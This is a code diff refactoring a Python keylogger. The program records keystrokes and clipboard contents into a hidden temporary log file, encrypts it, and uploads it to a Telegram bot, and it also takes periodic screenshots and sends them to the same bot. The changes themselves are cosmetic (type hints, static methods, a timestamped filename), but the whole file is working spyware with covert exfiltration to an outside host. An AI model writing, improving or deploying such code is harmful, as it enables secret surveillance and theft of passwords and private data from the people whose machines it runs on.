@@ -45,23 +45,24 @@ class Keylogger:
 
     def __init__(self) -> None:
         self.duplicate = ['']
+        self.filename = join(gettempdir(), f'{datetime.now().strftime(".%d%m%Y%H%M%S")}.log')
 
-    def savefile(self, data) -> None:
+    def savefile(self, data: str) -> None:
         try:
-            file_exists = isfile(FILENAME)
+            file_exists = isfile(self.filename)
 
-            with open(FILENAME, 'a+') as fh:
-                fh.write(str(data))
+            with open(self.filename, 'a+') as fh:
+                fh.write(data)
 
             if not file_exists and name == 'nt':  # checks if the system is windows and file didn't exist before
-                system(f'attrib +h {FILENAME}')
+                system(f'attrib +h {self.filename}')
         except Exception as e:
             alarm(f'Error: {e}')
 
     def keylogging(self) -> None:
         def on_key_press(key) -> None:
 
-            def is_duplicate(data) -> bool:
+            def is_duplicate(data: str) -> bool:
                 if data and data != self.duplicate[0]:
                     self.duplicate[0] = data
                     return False
@@ -75,7 +76,7 @@ class Keylogger:
                     self.savefile(f'clipboard data: {data}\n')
 
                 # Log the Keystrokes
-                self.savefile(f'{str(key)}\n')
+                self.savefile(f'{key}\n')
 
             except Exception as e:
                 alarm(f'Error: {e}')
@@ -93,10 +94,8 @@ class Keylogger:
 # Send the file to Telegram at regular intervals
 class Uploader:
 
-    def __init__(self) -> None:
-        pass
-
-    def encrypt_file(self, filename) -> None:
+    @staticmethod
+    def encrypt_file(filename: str) -> None:
         try:
             with open(filename, 'rb') as f:
                 data = f.read()
@@ -114,7 +113,7 @@ class Uploader:
                 if exists(FILENAME):
                     self.encrypt_file(FILENAME)
                     with open(ENCRYPTED_FILENAME, 'rb') as fh:
-                        files = {'document' : fh}
+                        files = {'document': fh}
                         resp = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}', files=files)
 
                         if resp.status_code != 200:
@@ -134,15 +133,13 @@ class Uploader:
 # Take screenshots periodically
 class ScreenshotCapture:
 
-    def __init__(self) -> None:
-        pass
-
-    def take_screenshot(self) -> None:
+    @staticmethod
+    def take_screenshot() -> None:
         try:
             screenshot = pyautogui.screenshot()
             screenshot.save(SCREENSHOT_FILENAME)
             with open(SCREENSHOT_FILENAME, 'rb') as fh:
-                files = {'document' : fh}
+                files = {'document': fh}
                 resp = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}', files=files)
 
                 if resp.status_code != 200:
